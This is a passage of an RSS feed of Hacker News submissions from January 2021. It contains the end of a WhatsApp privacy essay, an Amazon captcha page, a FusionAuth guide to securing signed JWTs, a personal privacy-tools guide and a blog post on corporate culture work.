Imagine instead we would have started with the invisible, instantaneous, inanimate technology. Would you have been able to feel any outrage? Any whatsoever? Would you naturally think of coming up with an analog equivalent scenario to gauge your outrage?</p><p>You actually don't need to imagine the last example. If you're currently using WhatsApp, you're living inside of it. The hairdresser represents Facebook and the coat rummaging policy represents their new privacy policy, or Facebook's general conduct for that matter. If you don't feel outrage, then perhaps that's because you haven't imagined the analog equivalent of what's happening yet (which isn't always self-evident, that‚Äôs what I‚Äôve tried to help you with here) <sup id="fnref-6"><a href="#fn-6">6</a></sup>.</p><p>The key observation to note here is that the outrage that gets triggered inside of you gets modulated by <em>the manner in which</em> your information gets extracted, not so much <em>if</em> it gets extracted. It's as if robbing someone of $100 would somehow be less outrageous if you did it through the internet rather than snatching it directly from their wallet.</p><p>In a high-tech society, where we‚Äôre surrounded by technological abstractions upon abstractions, should we only be relying on our instinctual outrage circuits to be our moral compasses when they can so easily be fooled?</p><p><em>Even though the hairdresser in this story (Facebook / WhatsApp) is rummaging through your coat, there are many reputable hairdressers (messaging services) that do not. My favourite alternative is <a href="https://signal.org/">Signal</a> <sup id="fnref-7"><a href="#fn-7">7</a></sup>, but I've heard good things about <a href="https://threema.ch/">Threema</a> and although I don't get the impression the technology is accessible enough to port my friends and family, I'm supportive of what <a href="https://matrix.org/">Matrix</a> is trying to accomplish.</em></p></div></article></div>]]>
            </description>
            <link>https://jessems.com/hairdresser-analogy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791684</guid>
            <pubDate>Fri, 15 Jan 2021 15:00:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Hacker News Top (Alexa Skill)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791569">thread link</a>) | @feyjal
<br/>
January 15, 2021 | https://www.amazon.ca/dp/B08T61KL3X/ref=sr_1_3?dchild=1&keywords=hacker+news&qid=1610722155&s=digital-skills&sr=1-3 | <a href="https://web.archive.org/web/*/https://www.amazon.ca/dp/B08T61KL3X/ref=sr_1_3?dchild=1&keywords=hacker+news&qid=1610722155&s=digital-skills&sr=1-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

    <div>

        

        <div>
            <div>
                <h4>Enter the characters you see below</h4>
                <p>Sorry, we just need to make sure you're not a robot. For best results, please make sure your browser is accepting cookies.</p>
                </div>
            </div>

            <div>

                <div>
                    <div>

                        <form method="get" action="/errors/validateCaptcha" name="">
                            
                            <div>
                                <div>
                                    <div>
                                        <h4>Type the characters you see in this image:</h4>
                                        <p><img src="https://images-na.ssl-images-amazon.com/captcha/wxvwzfzh/Captcha_barvmgfxot.jpg">
                                        </p>
                                        <div>
                                            <div>
                                                
                                                <div>
                                                    <p><a onclick="window.location.reload()">Try different image</a>
                                                </p></div>
                                            </div>
                                            </div>
                                    </div>
                                </div>
                            </div>

                            <div>

                                

                            </div>
                        </form>

                    </div>
                </div>

            </div>

        </div>

        <div></div>

        <div>
            <p><a href="https://www.amazon.ca/gp/help/customer/display.html/ref=footer_cou?ie=UTF8&amp;nodeId=1040616">Conditions of Use &amp; Sale</a>
            <span></span>
            <span></span>
            <span></span>
            <span></span>
            <a href="https://www.amazon.ca/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=502584">Privacy Notice</a>
        </p></div>

        <p>
          ¬© 1996-2015, Amazon.com, Inc. or its affiliates
          
          
        </p>
    </div></div>]]>
            </description>
            <link>https://www.amazon.ca/dp/B08T61KL3X/ref=sr_1_3?dchild=1&amp;keywords=hacker+news&amp;qid=1610722155&amp;s=digital-skills&amp;sr=1-3</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791569</guid>
            <pubDate>Fri, 15 Jan 2021 14:50:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Secure Signed JWT]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791280">thread link</a>) | @mooreds
<br/>
January 15, 2021 | https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/ | <a href="https://web.archive.org/web/*/https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>JSON Web Tokens (JWTs) get a lot of hate online for being insecure. Tom Ptacek, founder of <a href="https://latacora.com/">Latacora</a>, a security consultancy, had this to say about <a href="https://news.ycombinator.com/item?id=14292223">JWTs in 2017</a>:</p>

<blockquote>
  <p>So, as someone who does some work in crypto engineering, arguments about JWT being problematic only if implementations are ‚Äúbungled‚Äù or developers are ‚Äúincompetent‚Äù are sort of an obvious ‚Äútell‚Äù that the people behind those arguments aren‚Äôt really crypto people. In crypto, this debate is over.</p>

  <p>I know a lot of crypto people who do not like JWT. I don‚Äôt know one who does.</p>
</blockquote>

<p>Despite some negative sentiment, JWTs are a powerful and secure method of managing identity and authorization ‚Äì they simply need to be used properly. They have other benefits too, they‚Äôre flexible, <a href="https://tools.ietf.org/html/rfc7519">standardized</a>, stateless, portable, easy to understand, and extendable. They also have libraries to help you generate and consume them in almost every programming language.</p>

<p>This article will help make sure your JWTs are unassailable. It‚Äôll cover how you can securely integrate tokens into your systems by illustrating the most secure options.</p>

<p>However, every situation is different. You know your data and risk factors, so please learn these best practices and then apply them using judgement. A bank shouldn‚Äôt follow the same security practices as a ‚Äòtodo‚Äô SaaS application; take your needs into account when implementing these recommendations.</p>

<p>One additional note regarding the security of JWTs is that they are similar in many respects to other signed data, such as SAML assertions. While JWTs are often stored in a wider range of locations than SAML tokens are, it is always recommended that you carefully protect any signed tokens.</p>

<h2 id="definitions">Definitions</h2>

<ul>
  <li><strong>creator</strong>: the system which creates the JWTs. In the world of OAuth this is often called an Authorization Server or AS.</li>
  <li><strong>consumer</strong>: a system which consumes a JWT. In the world of OAuth this is often called the Resource Server or RS. These consume a JWT to determine if they should allow access to a Protected Resource such as an API.</li>
  <li><strong>client</strong>: a system which retrieves a token from the creator, holds it, and presents it to other systems like a consumer.</li>
  <li><strong>claim</strong>: a piece of information asserted about the subject of the JWT. Some are standardized, others are application specific.</li>
</ul>

<h2 id="out-of-scope">Out of scope</h2>

<p>This article will only be discussing signed JWTs. Signing of JSON data structures is <a href="https://tools.ietf.org/html/rfc7515">standardized</a>. There are also standards for <a href="https://tools.ietf.org/html/rfc7516">encrypting JSON data</a> but signed tokens are more common, so we‚Äôll focus on them. Therefore, in this article the term JWT refers to signed tokens, not encrypted ones.</p>

<h2 id="security-considerations">Security considerations</h2>

<p>When you are working with JWTs in any capacity, be aware of the footguns that are available to you (to, you know, let you shoot yourself in the foot).</p>

<p>The first is that a signed JWT is like a postcard. Anyone who has access to it can read it. Though this may look illegible, it‚Äôs trivial to decode:</p>

<div><div><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmdXNpb25hdXRoLmlvIiwiZXhwIjoxNTkwNzA4Mzg1LCJhdWQiOiIyMzhkNDc5My03MGRlLTQxODMtOTcwNy00OGVkOGVjZDE5ZDkiLCJzdWIiOiIxOTAxNmI3My0zZmZhLTRiMjYtODBkOC1hYTkyODc3Mzg2NzciLCJuYW1lIjoiRGFuIE1vb3JlIiwicm9sZXMiOlsiUkVUUklFVkVfVE9ET1MiXX0.8QfosnY2ZledxWajJJqFPdEvrtQtP_Y3g5Kqk8bvHjo
</code></pre></div></div>

<p>You can decode it using <a href="https://fusionauth.io/learn/expert-advice/dev-tools/jwt-debugger">any number of online tools</a>, because it‚Äôs just three base 64 encoded strings joined by periods.</p>

<p>Keep any data that you wouldn‚Äôt want in the hands of someone else outside of your JWT. When you sign and send a token, or when you decode and receive it, you‚Äôre guaranteed the contents didn‚Äôt change. You‚Äôre not guaranteed the contents are unseen.</p>

<p>A corollary of that is that any information you do send should avoid unintentional data leakage. This would include information such as identifiers. If a JWT includes a value like <code>123</code> for an id, that means anyone viewing it has a pretty good idea that there is an entity with the id of <code>122</code>. Use a GUID or random string for identifiers instead. Likewise, because tokens are not encrypted, use TLS for transmitting them.</p>

<p>Don‚Äôt send JWTs using an HTTP method that may be cached or logged. So don‚Äôt append the token to a <code>GET</code> request as a parameter. If you must send it in a GET request, use an HTTP header. You can also use other HTTP methods such as <code>POST</code>, which sends the JWT as a part of a request body. Sending the token value as part of a <code>GET</code> URL might result in the JWT being stored in a proxy‚Äôs memory or filesystem, a browser cache, or even in web server access logs.</p>

<p>If you are using OAuth, be careful with the Implicit grant, because if not implemented correctly, it can send the JWT (the access token) as a request parameter or fragment. For example, the <a href="https://developers.docusign.com/esign-rest-api/guides/authentication/oauth2-implicit#step-1-obtain-the-access-token">Docusign esign REST API</a> delivers the access token as a URL fragment. Oops.</p>

<h2 id="creating-tokens">Creating tokens</h2>

<p>When you are creating a JWT, use a library. Don‚Äôt implement this RFC yourself. There are lots of <a href="https://openid.net/developers/jwt/">great libraries out there</a>. Use one.</p>

<p>Set the <code>typ</code> claim of your JWT header to a known value. This prevents one kind of token from being confused with one of a different type.</p>

<h3 id="signature-algorithms">Signature algorithms</h3>

<p>Choose the correct signing algorithm. You have two families of options, a symmetric algorithm like HMAC or an asymmetric choice like RSA or elliptic curve (ECC). The <code>"none"</code> algorithm, which doesn‚Äôt sign the JWT and allows anyone to generate a token with any payload they want, should not be used and any JWTs that use this signing algorithm (meaning they aren‚Äôt signed) should be rejected immediately.</p>

<p>There are two main factors in algorithm selection. The first is performance. A symmetric signing algorithm like HMAC is simply faster. Here are the benchmark results using the <code>ruby-jwt</code> library, which encoded and decoded a token 50,000 times:</p>

<div><div><pre><code>hmac encode
  4.620000   0.008000   4.628000 (  4.653274)
hmac decode
  6.100000   0.032000   6.132000 (  6.152018)
rsa encode
 42.052000   0.048000  42.100000 ( 42.216739)
rsa decode
  6.644000   0.012000   6.656000 (  6.665588)
ecc encode
 11.444000   0.004000  11.448000 ( 11.464170)
ecc decode
 12.728000   0.008000  12.736000 ( 12.751313)
</code></pre></div></div>

<p>Don‚Äôt look at the absolute numbers, they‚Äôre going to change based on the programming language, what‚Äôs happening on the system during a benchmark run, and CPU horsepower. Instead, focus on the ratios. RSA encoding took approximately 9 times as long as HMAC encoding. ECC took almost two and a half times as long to encode and twice as long to decode. The code is <a href="https://github.com/FusionAuth/fusionauth-example-ruby-jwt/blob/master/benchmark_algos.rb">available</a> if you‚Äôd like to take a look. Symmetric signatures are faster than asymmetric options.</p>

<p>However, the shared secret required for options like HMAC has security implications. The token consumer can create a JWT indistinguishable from a token built by the creator, because both have access to the algorithm and the shared secret.</p>

<p>The second factor in choosing the correct signing algorithm is secret distribution. HMAC requires a shared secret to decode and encode the token. This means you need some method to provide the secret to both the creator and consumer of the JWT. If you control both parties and they live in a common environment, this is not typically a problem; you can add the secret to whatever secrets management solution you use and have both entities pull the secret from there. However, if you want outside entities to be able to verify your tokens, choose an asymmetric option. This might happen if the consumer is operated by a different department or business. The token creator can use the <a href="https://tools.ietf.org/html/rfc7517">JWK</a> specification to publish public keys, and then the consumer of the JWT can validate it using that key.</p>

<p>By using public/private key cryptography to sign the tokens, the issue of a shared secret is bypassed. Because of this, using an asymmetric option allows a creator to provide JWTs to token consumers that are not trusted. No system lacking the private key can generate a valid token.</p>

<p>If you have a choice between RSA and elliptic curve cryptography for a public/private key signing algorithm, choose elliptic curve cryptography, as it‚Äôs easier to configure correctly, more modern, has fewer attacks, and is faster. You might have to use RSA if other parties don‚Äôt support ECC.</p>

<h3 id="claims">Claims</h3>

<p>Make sure you set your claims appropriately. The JWT specification is clear:</p>

<blockquote>
  <p>The set of claims that a JWT must contain to be considered valid is context dependent and is outside the scope of this specification.</p>
</blockquote>

<p>Therefore no claims are required by the RFC. But to maximize security, the following registered claims should be part of your token creation:</p>

<ul>
  <li><code>iss</code> identifies the issuer of the JWT. It doesn‚Äôt matter exactly what this string is as long as it is unique, doesn‚Äôt leak information about the internals of the issuer, and is known by the consumer.</li>
  <li><code>aud</code> identifies the audience of the token. This can be a scalar or an array value, but in either case it should also be known by the consumer.</li>
  <li><code>nbf</code> and <code>exp</code> claims determine the timeframe that the token is valid. The <code>nbf</code> claim can be useful if you are issuing a token for future use. The <code>exp</code> claim, a time beyond which the JWT is no longer valid, should always be set.</li>
</ul>

<h3 id="revocation">Revocation</h3>

<p>Because it is difficult to invalidate JWTs once issued‚Äìone of their benefits is that they are stateless, which means that their holders don‚Äôt need to reach out to any server to verify they are valid‚Äìyou should keep their lifetime on the order of hours or minutes, rather than days or months. Short lifetimes mean that should a JWT be stolen, the stolen token will soon expire and no longer be accepted by the consumer.</p>

<p>But there are times, such as a data breach or a user logging out of your application, when you‚Äôll want to revoke tokens, either across a system or on a more granular level. You have a few choices here. These are in order of how much effort implementation would require from the token consumer:</p>

<ul>
  <li>Let tokens expire. No effort required here.</li>
  <li>Have the creator rotate the secret or private key. This invalidates all extant tokens.</li>
  <li>Use a ‚Äòtime window‚Äô solution in combination with webhooks. Read more about this ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/">https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/</a></em></p>]]>
            </description>
            <link>https://fusionauth.io/learn/expert-advice/tokens/building-a-secure-jwt/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791280</guid>
            <pubDate>Fri, 15 Jan 2021 14:27:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Close the curtains: A practical guide to privacy]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791214">thread link</a>) | @yashmehrotra
<br/>
January 15, 2021 | https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/ | <a href="https://web.archive.org/web/*/https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
  <section class="page">
  <article>
    <header>
      
    </header>

    <h2 id="the-need-for-privacy">The need for privacy</h2>
<blockquote>
<p>Why should I care about privacy, I have nothing to hide</p>
</blockquote>
<p>Until a few years back, this question was very difficult to answer. People always perceived privacy in the physical sense. No one grasped the concept of digital privacy, let alone care about it.</p>
<p>You wouldn‚Äôt want a stranger to enter your home uninvited, right? So why treat your digital world any different. Your digital world contains private information like conversations, interactions, interests, and transactions that are worth protecting.</p>
<p><img src="https://yashmehrotra.com/images/privacy-snowden-quote.png" alt="Snowden Quote"></p>
<p>With invasive ads and all websites you visit keeping a track of you, I would say a breaking point will be reached soon. In action, it would be defined as when someone would go the inconvenient way of achieving a task to preserve their privacy.</p>
<p>The harsh truth is, <a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a> is <a href="https://thereader.mitpress.mit.edu/tech-companies-are-profiling-us-from-before-birth/">real</a>, and it is <a href="https://qz.com/1950685/instagrams-shop-tab-shows-the-dangers-surveillance-capitalism/">rising</a>. With FAAG (Facebook, Apple, Amazon &amp; Google) either buying every company or eliminating them by copying their feature‚Äôs which remotely threaten them, they are centralizing all your data. Google recently acquired FitBit (a fitness tracker manufacturing company) only to have an <a href="https://www.theverge.com/2020/8/4/21353947/google-fitbit-acquisition-eu-investigation-antitrust-health-tracking-data">anti-trust investigation launched</a> against them with fears over Google misusing health data.</p>
<p>Fortunately, as times changed, people‚Äôs mindsets changed as well. They started realizing that the lives they live digitally have significance too. And those who still weren‚Äôt quite convinced, Facebook and Google ironically played a major role in persuading them their privacy is actually at stake by crossing the line far too many times.<img src="https://yashmehrotra.com/images/privacy-news-articles.png" alt="They just don‚Äôt care"></p>
<p>The question which arises is what can we do? Are we becoming too set in our ways or can we take back what should have always belonged to us,  our privacy.</p>
<h2 id="why-an-eventual-compromise-is-the-answer">Why an eventual compromise is the answer</h2>
<p>Going off the grid is impractical. Migrating away from an entire ecosystem is strenuous. The FAAG are here to stay.</p>
<p>An eventual compromise here means restricting yourself to use only a few services provided by those companies but only limited to that. A trade-off essentially and making your peace with it.</p>
<p>The bitter reality is that distancing yourself from these services comes at a greater cost of convenience. While there are some extremists who have taken those difficult steps, they also have to convince their friends and family as well to make the switch.</p>
<p>As much as you may disgust Facebook, you might still have to use WhatsApp because everyone else already does, it is more of a necessity now. Albeit, Signal is gaining some much deserved popularity recently, it is still miles away from WhatsApp‚Äôs market cap.</p>
<p>Ever thought of removing Google entirely from your life? It is nerve-racking.</p>
<p>This is where trade-offs and calculated risks come into place. Rather than going cold turkey on the services deeply rooted in our lives, we choose to be aware of what information do they have about us and the risks that they pose. We take a conscious call knowing how much and what kind of data are we sharing and what we are getting in exchange.</p>
<h2 id="evaluation-criteria">Evaluation criteria</h2>
<p>Everyone has a different framework when it comes to choosing the tool to use.</p>
<p>Some people value ease of use whilst others may value integrations with different software.</p>
<p>Some would value privacy over functionality, others may not.</p>
<p>Some prefer to go for self-hosted tools whereas a huge part of the population don‚Äôt even know what that means.</p>
<p>This depends on person to person and use case to use case, think one of your own.</p>
<p>While deciding, also keep in mind the privacy laws of your country (esp. Key disclosure law) and whether the service you are using is part of <a href="https://restoreprivacy.com/5-eyes-9-eyes-14-eyes/">5-9-14 eyes</a>. If you think this is too extreme, you can just skim through the Privacy Policy and see whether you are comfortable with the data they are capturing and sharing with their third-party services.</p>
<p>The <a href="https://www.privacytools.io/">privacytools.io</a> website could be your guide for this process.</p>

<p><strong>Browser: Firefox</strong></p>
<p>I use Firefox because of its simplicity, care for user‚Äôs privacy, and <a href="https://www.mozilla.org/en-US/about/manifesto/">Mozilla‚Äôs commitment to keeping the web an open platform</a>. Feature-wise, Firefox is at par with other browsers and I have found it to be less RAM hungry than Chrome.</p>
<p>Extensions:</p>
<ul>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">Multi-account containers: </a> It lets you keep parts of your online life separated into color-coded tabs that preserve your privacy. For eg. I have containers for Personal, Work, Google, Banking, Shopping, etc. This ensures that cookies aren‚Äôt shared between those containers and is essentially equivalent to using a different browser. My goal for this year is to not see a single relevant advertisement.</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">uBlock Origin</a>: Block all the unwanted trackers (You can also install this on your mobile phone).</li>
<li>You can also go through this <a href="https://blog.mozilla.org/firefox/make-your-firefox-browser-a-privacy-superpower-with-these-extensions/">list of privacy enhancing extensions curated by Mozilla</a>.</li>
</ul>
<p><strong>Storage</strong></p>
<p>Since the dawn of the digital age, we have accumulated massive amount of data over the years. After all, we use multiple devices each of which have their own storage. But keep in mind that these are our private files and should be kept with a company that respects our privacy.</p>
<ul>
<li>I personally use pCloud. It is the least of all the evils (although they charge extra for zero knowledge encrypted storage).</li>
<li><a href="https://protonmail.com/blog/proton-drive-early-access/">ProtonDrive</a> is also releasing soon which seems promising.</li>
<li>If you want to self-host, Nextcloud and Syncthing are good.</li>
<li>Just do not go for Google Drive, iCloud or OneDrive.</li>
<li>Follow the 3-2-1 backup rule: At least 3 copies of your data in 2 different locations, 1 of which needs to be off-site.</li>
</ul>
<p><strong>Email</strong></p>
<ul>
<li>Slowly moving to <a href="https://protonmail.com/">ProtonMail</a> for primary mail. Privacy is their unique selling point.</li>
<li>Gmail due to legacy reasons. A lot of critical accounts and contacts still have that email.</li>
</ul>
<p><strong>Communication</strong></p>
<ul>
<li>Use Signal</li>
<li>Avoid WhatsApp, Facebook will eventually get rid of the end-to-end encryption.</li>
<li>Story Time: After selling Whatsapp to Facebook, the founder Brian Acton was assured that end-to-end encryption won‚Äôt be removed and they‚Äôll figure other ways to monetize it. Though Facebook failed to keep their end of the deal, which ended up with Brian Acton donating $50 million USD to Open Whisper Foundation (Signal‚Äôs Parent organization).</li>
</ul>
<p><strong>Password management</strong></p>
<ul>
<li>Use a password manager. Period.</li>
<li>Use different passwords for different websites so that in case one company‚Äôs database gets breached, you wouldn‚Äôt have to worry about other websites (All the password managers have password generation functionality).</li>
<li>I personally advocate for <a href="https://bitwarden.com/">Bitwarden</a>, but <a href="https://www.lastpass.com/">Lastpass</a> and <a href="https://1password.com/">1password</a> are good too.</li>
<li>Keep in mind that your password manager will be your single point of failure so you need to make sure that the masters password is extremely strong.</li>
</ul>
<p><strong>VPN</strong></p>
<ul>
<li>Not easy to choose, they all have pro‚Äôs and con‚Äôs. Use <a href="https://privacytools.io/providers/vpn/">privacytools‚Äôs VPN page</a> to choose and also take a look at country of origin and their logging policy.</li>
<li>Tor Browser is the best for anonymous browsing but some of the websites you use may break over there.</li>
</ul>
<p><strong>Search Engine</strong></p>
<ul>
<li>I know, I know, the others are not as good as Google. But they are not all that bad. I‚Äôve been using <a href="https://duckduckgo.com/">DuckDuckGo</a> for quite sometime and it works 95% of the time, and is improving constantly.</li>
<li>The problem with Google is not only does it scan and analyze all your searches, it has its <a href="https://www.rt.com/usa/503964-whistleblower-google-skews-results/">own biases</a> and is known for <a href="https://www.theregister.com/2020/10/21/google_search_iframe/">skewing the results</a> as <a href="https://www.ccn.com/google-manipulates-search-results-former-engineer-shockingly-confirms/">they see fit</a>.</li>
</ul>
<h2 id="behavioral-changes-you-can-make">Behavioral changes you can make</h2>
<p>When it comes to a certain behavior, our brains are hard-wired to do things subconsciously that we ourselves may not be aware of. Companies research and study this behavior, and do their best to exploit this.</p>
<p>Here are a few common things that you can start with:</p>
<ul>
<li>
<p>No need to tell EVERYONE your email</p>
<ul>
<li>Use a temporary email if you just want to check out a site that requires account creation. Services like <a href="https://temp-mail.org/">TempMail</a> can be used to get temporary emails.</li>
<li>It will help you reduce the unwanted amount of spam.</li>
</ul>
</li>
<li>
<p>Don‚Äôt share unnecessary details</p>
<ul>
<li>If a site asks for your birthday or gender, don‚Äôt give it.</li>
<li>Don‚Äôt fill out all the details of the profile page unless the functioning of the website is being effected.</li>
<li>James Jani, a YouTuber <a href="https://www.youtube.com/watch?v=uZ2l-kk5ihk">explains how this data eventually ends up being sold to the highest bidder</a>.</li>
</ul>
</li>
<li>
<p>Use incognito mode if you are just browsing and don‚Äôt want a persistent session</p>
<ul>
<li>This applies to all searches and website visits. The rule of thumb I follow is: If you have to login, use a normal window, else go incognito.</li>
<li>Incognito mode does not hide your browsing from service providers, but it makes it harder for ad networks to track you across different websites.</li>
</ul>
</li>
<li>
<p>The whole world is watching philosophy</p>
<ul>
<li>For social media sites like Instagram/Twitter/Facebook: Assume everything you post is public. It would not just be viewed by your friends or followers, everyone can see what you post.</li>
<li>This comes under the ‚ÄúEventual compromise‚Äù we discussed earlier, we are aware of the negative consequences but we take a call because <del>we want to be up to date with the memes</del> these websites can have a positive effect if we use them the right way.</li>
</ul>
</li>
<li>
<p>Avoid ‚Äúsmart‚Äù devices</p>
<ul>
<li>Both Amazon and Google‚Äôs home devices have been caught listening to user‚Äôs when they weren‚Äôt supposed to.</li>
<li><a href="https://www.theguardian.com/technology/2019/oct/09/alexa-are-you-invading-my-privacy-the-dark-side-of-our-voice-assistants">Amazon‚Äôs echo apparently sent their owner‚Äôs recordings to someone else without their permission or knowledge</a> and <a href="https://www.cnbc.com/2019/07/11/google-admits-leaked-private-voice-conversations.html">Google just doesn‚Äôt care enough once they acquire the data</a>.</li>
</ul>
</li>
<li>
<p>Review your phone‚Äôs app permissions</p>
<ul>
<li>Mobile apps would try their hardest to get as many data points as they can which often includes sending &amp; connecting to trackers automatically in the background.</li>
<li>Be aware of which apps have critical permissions like location, microphone &amp; camera.</li>
<li>Android and iOS did introduce the ‚ÄúAllow permission just for now‚Äù functionality to curb this.</li>
</ul>
</li>
</ul>
<blockquote>
<p>If you are not paying for the product, then the gradual changes in your behavior &amp; perception is the product</p>
<p>‚Äì Jaron Lanier (The Social Dilemma)</p>
</blockquote>

<ul>
<li>It may be hard to, but get off Facebook. It went from being a good social media platform to catch-up with your peers but now it has turned into a tool used to ‚Äúprogram people‚Äôs thoughts‚Äù. <a href="https://www.youtube.com/watch?v=MakEIlvlyfE">Here is a former Facebook exec talking about how it is tearing apart the fabric of society</a>.</li>
<li>Luckily for me, most of my close circle slowly ‚Ä¶</li></ul></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/">https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/</a></em></p>]]>
            </description>
            <link>https://yashmehrotra.com/post/2021-01-15-practical-guide-to-privacy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25791214</guid>
            <pubDate>Fri, 15 Jan 2021 14:21:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why most 'culture work' hurts your company]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25791209">thread link</a>) | @lzybes
<br/>
January 15, 2021 | https://www.purpose.jobs/blog/why-most-culture-work-actually-hurts-your-company | <a href="https://web.archive.org/web/*/https://www.purpose.jobs/blog/why-most-culture-work-actually-hurts-your-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><em>And the simple way to ensure your culture eats strategy for lunch.</em></p>
<!--more-->
<p>A quick story to set the stage: About six years ago I scaled my company from 15-employees to 75-employees in about nine months, which was one of the most painful experiences of my business life. Our corporate culture, previously a strong suit of the business, was completely unprepared for the stresses of that type of rapid scale-up, and the growth almost killed my company.</p>
<p>Then we did the incredibly challenging work of transforming our culture from the inside out, while still hitting milestones of a venture-backed, high-growth company. With the support of a ton of dedicated people, we did it, and the company is now back on track to (fingers crossed) win the market.</p>
<p>All this to say that, having nearly ruined my company due to underinvesting in culture at a critical time, and having done the hard work of fixing and rebuilding our culture to become a strength once again, I have a unique appreciation for the importance, and delicacy, of corporate culture.</p>
<div><p>Here's the first thing I discuss with entrepreneurs as they start to work consciously on their culture:</p></div>
<h3>Why most ‚Äúculture work‚Äù actually hurts your company, and what to do about it</h3>
<blockquote>
<p>‚ÄúCulture eats strategy for lunch‚Äù ‚Äî Peter Drucker</p>
</blockquote>
<p>This is one of the most popular quotes on corporate culture. And it‚Äôs true. The best company cultures are the foundation on which successful strategy after successful strategy are built.</p>
<p>So everyone should hire people to focus on culture, point them in the right direction, and get out of their way. Right?</p>
<p>Wrong.</p>
<p>According to Fred Kofman, author of Conscious Business and culture consultant to hundreds of organizations, the vast majority of culture work does more harm than good. As in, not only doesn‚Äôt it improve the culture, most culture work actually harms the culture it‚Äôs trying to help. America spends billions on corporate culture each year, and the sad reality is that, on average, companies would be better off simply crossing their fingers.</p>
<p>But why? Why does most of the effort put toward the most powerful lever in business backfire? Perhaps even more importantly, how can you ensure that the work you put into building your culture intentionally is among the small percentage that eats strategy for lunch?</p>
<p><a href="https://www.purpose.jobs/blog/culture-contribution-no-longer-say-culture-fit" rel="noopener" target="_blank"><img src="https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=1600&amp;name=Related%20blog%20articles%20(1).png" alt="Related blog articles (1)" width="1600" srcset="https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=800&amp;name=Related%20blog%20articles%20(1).png 800w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=1600&amp;name=Related%20blog%20articles%20(1).png 1600w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=2400&amp;name=Related%20blog%20articles%20(1).png 2400w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=3200&amp;name=Related%20blog%20articles%20(1).png 3200w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=4000&amp;name=Related%20blog%20articles%20(1).png 4000w, https://www.purpose.jobs/hs-fs/hubfs/Related%20blog%20articles%20(1).png?width=4800&amp;name=Related%20blog%20articles%20(1).png 4800w" sizes="(max-width: 1600px) 100vw, 1600px"></a></p>
<p><strong>Start with discovery, not Generation</strong></p>
<p>Ask ten CEOs what makes a good company culture, and they‚Äôll all say something similar: Trust, freedom, autonomy, mastery, purpose, ping pong tables... For many leaders, when they set to work thinking about company culture their first instinct is to simply brainstorm (generate) the culture they want, usually some version of the above, and then figure out the quickest way to communicate those values to their team.</p>
<p><strong>This is the single most common way to disillusion your team and hurt your culture with the best of intentions. Because culture work must start with discovery, not generation.</strong></p>
<blockquote>
<p>There‚Äôs no way to open the future without closing the past. Unless the company‚Äôs leadership does a serious examination of their previous disengaging behaviors, and convinces the workforce that they are committed to change that behavior in a serious way, any engagement program is dead on arrival. ‚Äî Fred Kofman</p>
</blockquote>
<p>The reality is that even if you‚Äôve never thought about it, <span>your company already has a well-engrained culture with very specific characteristics, all of which your employees know well even if you do not (and if you think you do, but you haven‚Äôt asked employees to confirm, don‚Äôt be so sure)</span>. As a result, any values or mission you put on the wall, if they don‚Äôt match the actual, existing culture already present, they will communicate to your team you are clueless and, slowly or quickly, they‚Äôll begin to check out. It‚Äôs as if your parents, after consistently missing your soccer games for partner calls,&nbsp;call a family meeting to say their core family value is ‚Äútogetherness.‚Äù</p>
<p>Effective culture change work, the kind that changes an entire company rather than simply making an executive team feel progressive, begins with a deep discovery process. It asks the question: <strong>what is our existing culture now? What are our current values, whether or not we actually took the time to create them intentionally?</strong></p>
<p>Your parents first have to admit to their demonstrated value of ‚Äúwork&gt;family‚Äù and convince you they‚Äôre going to change, before you‚Äôll hear the word ‚Äútogetherness‚Äù without dripping cynicism. Similarly, <strong>you have to first discover, cop to, and clean up any messes resulting from your existing culture before you have the ability to change it.</strong></p>
